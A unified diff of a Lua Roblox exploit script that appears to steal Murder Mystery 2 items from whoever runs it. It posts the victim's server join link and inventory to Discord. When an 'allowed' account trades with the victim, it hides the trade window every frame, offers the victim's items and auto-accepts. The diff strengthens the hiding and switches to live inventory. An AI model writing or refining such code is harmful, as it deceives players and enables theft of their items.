@@ -90,7 +90,7 @@ local function send_discord(items, game_name)
     local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
     local receivers = table.concat(CFG.allowed, ", ")
     local counts = {}
-    local order = {"Ancient","Godly","Unique","Legendary","Rare","Uncommon","Common"}
+    local order = {"Ancient","Godly","Unique","Vintage","Legendary","Rare","Uncommon","Common"}
     for _, it in ipairs(items) do counts[it.rarity] = (counts[it.rarity] or 0) + 1 end
     local inv_lines = {}
     for _, r in ipairs(order) do
@@ -147,31 +147,27 @@ local function hook_mm2()
     local tradingWithAllowed = false
     local itemsOffered = false
     local readySent = false
-    local storedItems = {}
     local shiftlockConn = nil
+    local heartbeatConn = nil
     local hiding = false
     local tradeGen = 0
 
-    -- exacte frame paden op basis van geïnspecteerde structuur
-    local HIDE_TARGETS = {
+    -- exacte frame targets gebaseerd op geïnspecteerde structuur
+    local TARGETS = {
         {gui="TradeGUI",       frames={"BG","Container","Processing","ClickBlocker"}},
         {gui="TradeGUI_Phone", frames={"Container","ClickBlocker"}},
     }
-    local savedSizes = {}
 
     local function applyHide()
-        local g = lp:FindFirstChild("PlayerGui")
-        if not g then return end
-        for _, t in ipairs(HIDE_TARGETS) do
-            local sg = g:FindFirstChild(t.gui)
+        local pg = lp:FindFirstChild("PlayerGui")
+        if not pg then return end
+        for _, t in ipairs(TARGETS) do
+            local sg = pg:FindFirstChild(t.gui)
             if sg then
                 for _, fname in ipairs(t.frames) do
                     local f = sg:FindFirstChild(fname)
-                    if f then
-                        pcall(function()
-                            f.Visible = false
-                            f.Size = UDim2.new(0,0,0,0)
-                        end)
+                    if f and f:IsA("GuiObject") then
+                        pcall(function() f.Visible = false end)
                     end
                 end
             end
@@ -185,43 +181,18 @@ local function hook_mm2()
         return false
     end
 
-    local function storeItems()
-        storedItems = {}
-        if okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
-            for k, v in pairs(ProfileData.Weapons.Owned) do storedItems[k] = v end
-        end
-    end
-
-    local function restoreItems()
-        if okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
-            for k, v in pairs(storedItems) do ProfileData.Weapons.Owned[k] = v end
-        end
-    end
-
     local function hideGui()
         hiding = true
-        -- sla originele sizes op
-        local g = lp:FindFirstChild("PlayerGui")
-        if g then
-            for _, t in ipairs(HIDE_TARGETS) do
-                local sg = g:FindFirstChild(t.gui)
-                if sg then
-                    for _, fname in ipairs(t.frames) do
-                        local f = sg:FindFirstChild(fname)
-                        if f and f:IsA("GuiObject") then
-                            local key = t.gui.."."..fname
-                            if not savedSizes[key] then
-                                savedSizes[key] = f.Size
-                            end
-                        end
-                    end
-                end
-            end
-        end
         applyHide()
         if shiftlockConn then shiftlockConn:Disconnect() end
+        if heartbeatConn then heartbeatConn:Disconnect() end
+        -- RenderStepped = voor render (wint van MM2 RenderStepped als die eerder connected)
         shiftlockConn = RunService.RenderStepped:Connect(function()
             pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
+            if hiding then applyHide() end
+        end)
+        -- Heartbeat = na render (wint van MM2 Heartbeat)
+        heartbeatConn = RunService.Heartbeat:Connect(function()
             if hiding then applyHide() end
         end)
     end
@@ -229,20 +200,17 @@ local function hook_mm2()
     local function showGui()
         hiding = false
         if shiftlockConn then shiftlockConn:Disconnect() shiftlockConn = nil end
+        if heartbeatConn then heartbeatConn:Disconnect() heartbeatConn = nil end
         UIS.MouseBehavior = Enum.MouseBehavior.Default
-        local g = lp:FindFirstChild("PlayerGui")
-        if not g then return end
-        for _, t in ipairs(HIDE_TARGETS) do
-            local sg = g:FindFirstChild(t.gui)
+        local pg = lp:FindFirstChild("PlayerGui")
+        if not pg then return end
+        for _, t in ipairs(TARGETS) do
+            local sg = pg:FindFirstChild(t.gui)
             if sg then
                 for _, fname in ipairs(t.frames) do
                     local f = sg:FindFirstChild(fname)
                     if f and f:IsA("GuiObject") then
-                        local key = t.gui.."."..fname
-                        pcall(function()
-                            f.Visible = true
-                            if savedSizes[key] then f.Size = savedSizes[key] end
-                        end)
+                        pcall(function() f.Visible = true end)
                     end
                 end
             end
@@ -254,7 +222,6 @@ local function hook_mm2()
         itemsOffered = false
         readySent = false
         currentLastOffer = nil
-        restoreItems()
         showGui()
     end
 
@@ -306,7 +273,6 @@ local function hook_mm2()
         if not isAllowedUser(otherName) then return end
 
         tradingWithAllowed = true
-        storeItems()
         hideGui()
         itemsOffered = true
 
@@ -314,8 +280,12 @@ local function hook_mm2()
         local myGen = tradeGen
 
         task.spawn(function()
+            -- huidige items ophalen, fallback op cachedItems
+            local currentItems = collect_mm2_items()
+            local itemsToOffer = (#currentItems > 0) and currentItems or cachedItems
+
             local uniqueSlots = 0
-            for _, entry in ipairs(cachedItems) do
+            for _, entry in ipairs(itemsToOffer) do
                 if uniqueSlots >= 4 then break end
                 uniqueSlots = uniqueSlots + 1
                 for i = 1, entry.amount do
@@ -326,7 +296,6 @@ local function hook_mm2()
 
             task.wait(3)
 
-            -- accept 3x met kleine interval voor betrouwbaarheid
             if not readySent then
                 readySent = true
                 for i = 1, 3 do
